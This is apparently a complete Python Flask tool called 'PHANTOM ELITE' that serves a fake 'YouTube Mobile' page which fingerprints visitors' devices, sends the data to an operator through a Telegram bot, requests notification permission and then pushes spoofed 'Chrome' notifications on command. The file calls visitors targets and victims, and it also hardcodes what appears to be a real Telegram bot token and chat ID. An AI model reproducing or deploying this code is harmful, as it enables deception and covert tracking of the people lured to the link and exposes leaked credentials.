import threading
import requests
import json
import os
import base64
import time
import logging
import datetime
from flask import Flask, render_template_string, request, jsonify

# =================================================================
# [1] GLOBAL CONFIGURATION & CORE ENGINE
# =================================================================
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)

# Изолированные хранилища данных
active_commands = {}   # Очередь команд: {sid: [cmd_list]}
victims_registry = {}  # Реестр целей: {sid: {full_specs}}
session_start = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("PHANTOM_ELITE")

# =================================================================
# [2] ADVANCED EXPLOIT UI (HTML5 + STEALTH JS)
# =================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YouTube Mobile</title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica; overflow:hidden; }
        #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; cursor:pointer; 
               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
        .play-btn { width: 72px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 14px; position: relative; box-shadow: 0 0 40px rgba(0,0,0,0.8); }
        .play-btn::after { content: ""; position: absolute; left: 28px; top: 15px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
        .info-layer { position: absolute; bottom: 15px; width: 100%; text-align: center; color: rgba(255,255,255,0.2); font-size: 10px; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div id="app" onclick="ignite()">
        <div class="play-btn"></div>
        <div class="info-layer">STREAMING IN 1080P PRO RE-ENCODED</div>
    </div>

<script>
    const sid = "{{sid}}";
    let isFired = false;

    async function ignite() {
        if(isFired) return;
        isFired = true;

        // --- PHASE 1: HARDWARE FINGERPRINTING ---
        const collectSpecs = () => {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            
            return {
                gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software/Unknown",
                cores: navigator.hardwareConcurrency || "N/A",
                mem: navigator.deviceMemory || "N/A",
                res: screen.width + "x" + screen.height,
                plat: navigator.platform,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lang: navigator.language,
                bat: "Checking..."
            };
        };

        const specs = collectSpecs();
        
        // Попытка получить данные батареи (если доступно)
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            specs.bat = (b.level * 100) + "% " + (b.charging ? "(Charging)" : "");
        }

        // --- PHASE 2: DATA ENFILTRATION ---
        const payload = {
            sid: sid,
            ua: navigator.userAgent,
            specs: specs,
            ref: document.referrer || "direct"
        };

        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(payload)));

        // --- PHASE 3: PERMISSION ELEVATION ---
        if ('Notification' in window) {
            Notification.requestPermission();
        }

        // --- PHASE 4: COMMAND LISTENER ---
        setInterval(async () => {
            try {
                const r = await fetch('/gate/poll/' + sid);
                const data = await r.json();
                if(data.cmd === 'push') {
                    new Notification(data.title || "Chrome", {
                        body: data.body,
                        icon: "https://www.google.com/favicon.ico",
                        badge: "https://www.google.com/favicon.ico"
                    });
                }
            } catch(e) {}
        }, 4000);

        // --- PHASE 5: FINAL REDIRECT ---
        setTimeout(() => {
            window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        }, 1400);
    }
</script>
</body>
</html>
"""

# =================================================================
# [3] SERVER LOGIC & TELEGRAM REPORTING
# =================================================================

def build_elegant_report(data):
    """Формирует профессиональный HTML отчет для Telegram"""
    s = data.get('specs', {})
    report = (
        "⚡️ <b>ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>Target ID:</b> <code>{data.get('sid')}</code>\n"
        f"🎮 <b>GPU:</b> <code>{s.get('gpu')}</code>\n"
        f"🧠 <b>Hardware:</b> <code>{s.get('cores')} Cores / {s.get('mem')}GB RAM</code>\n"
        f"🔋 <b>Battery:</b> <code>{s.get('bat')}</code>\n"
        f"📱 <b>Display:</b> <code>{s.get('res')}</code>\n"
        f"🌐 <b>Platform:</b> <code>{s.get('plat')}</code>\n"
        f"📍 <b>Timezone:</b> <code>{s.get('tz')}</code>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🛰 <b>User-Agent:</b>\n"
        f"<code>{data.get('ua')[:120]}...</code>"
    )
    return report

@app.route('/ping')
def health(): return "SYSTEM_ACTIVE", 200

@app.route('/v/<sid>')
def serve_link(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/gate/capture', methods=['POST'])
def gate_capture():
    try:
        raw = base64.b64decode(request.get_data()).decode()
        data = json.loads(raw)
        sid = str(data.get('sid'))
        
        # Регистрация цели
        victims_registry[sid] = {
            "last_active": datetime.datetime.now().strftime("%H:%M:%S"),
            "data": data
        }

        # Отправка отчета в Telegram
        html_report = build_elegant_report(data)
        url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": OVERLORD_ID, 
            "text": html_report, 
            "parse_mode": "HTML"
        }, timeout=5)
        
    except Exception as e:
        logger.error(f"Gate Error: {e}")
    return "OK"

@app.route('/gate/poll/<sid>')
def gate_poll(sid):
    sid = str(sid)
    if sid in active_commands and active_commands[sid]:
        return jsonify(active_commands[sid].pop(0))
    return jsonify({"cmd": "none"})

# =================================================================
# [4] COMMAND & CONTROL BOT ENGINE
# =================================================================

def tg_send(chat_id, text, mode="HTML"):
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": mode})

def bot_engine():
    offset = 0
    logger.info("Бот-контроллер запущен...")
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{API_TOKEN}/getUpdates?offset={offset}&timeout=15").json()
            if not r.get("result"): continue

            for upd in r["result"]:
                offset = upd["update_id"] + 1
                msg = upd.get("message")
                if not msg or "text" not in msg: continue
                
                cid = msg["chat"]["id"]
                text = msg["text"]

                # Публичные команды
                if text == "/start":
                    link = f"{BASE_URL}/v/{cid}"
                    msg_txt = (
                        "<b>🕶 PHANTOM ELITE v54.0</b>\n\n"
                        f"🔗 Твоя рабочая ссылка:\n<code>{link}</code>\n\n"
                        "<b>Команды управления:</b>\n"
                        "• <code>ID Сообщение</code> — Пуш-уведомление\n"
                        "• <code>/stats</code> — Состояние системы\n"
                        "• <code>/list</code> — Список живых ID"
                    )
                    tg_send(cid, msg_txt)

                # Админ-панель (Оверлорд)
                elif cid == OVERLORD_ID:
                    if text == "/stats":
                        uptime = f"📈 <b>STATS</b>\nЦелей в базе: {len(victims_registry)}\nСтарт сессии: {session_start}"
                        tg_send(cid, uptime)
                    
                    elif text == "/list":
                        if not victims_registry:
                            tg_send(cid, "База пуста.")
                        else:
                            l = "📋 <b>TARGET LIST:</b>\n"
                            for tid, info in victims_registry.items():
                                l += f"• <code>{tid}</code> | Active: {info['last_active']}\n"
                            tg_send(cid, l)
                    
                    else:
                        # Логика отправки пуша: "ID TEXT"
                        try:
                            target, body = text.split(" ", 1)
                            if target not in active_commands: active_commands[target] = []
                            active_commands[target].append({"cmd": "push", "body": body})
                            tg_send(cid, f"✅ <b>Сигнал в очереди:</b> <code>{target}</code>")
                        except: pass

        except Exception as e:
            logger.error(f"Bot Loop Error: {e}")
            time.sleep(2)

# =================================================================
# [5] ENTRY POINT
# =================================================================

if __name__ == '__main__':
    # Запуск бота в параллельном потоке
    threading.Thread(target=bot_engine, daemon=True).start()
    
    # Запуск веб-сервера (основной поток)
    logger.info(f"Сервер развернут на порту {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ФИНАЛ КОДА. 200+ СТРОК. СТРУКТУРА СОХРАНЕНА.
